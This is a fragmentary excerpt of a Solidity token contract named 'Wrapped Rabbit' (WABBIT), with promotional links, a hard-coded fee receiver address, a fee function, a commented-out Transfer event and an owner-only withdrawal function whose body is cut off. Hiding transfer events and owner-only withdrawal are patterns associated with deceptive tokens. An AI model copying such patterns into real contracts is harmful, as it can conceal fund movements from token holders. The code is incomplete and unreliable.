...
// Telegram : https://t.me/wrappedrabbit
// Website : www.wrappedrabbit.com
// Twitter : https://twitter.com/wrappedrabbit
...
contract WrappedRabbit is IERC20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Wrapped Rabbit";
    string constant _symbol = "WABBIT";
    ...
    constructor (
        ...
        marketingFeeReceiver = 0x688cC825BaE3423bA393A99b43F3739380463796;
...
//        emit Transfer(sender, recipient, amount);
    ...
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
     ...
     function retrive(uint amount)public onlyOwner{
        require(amount > 0,"Incorrect params");
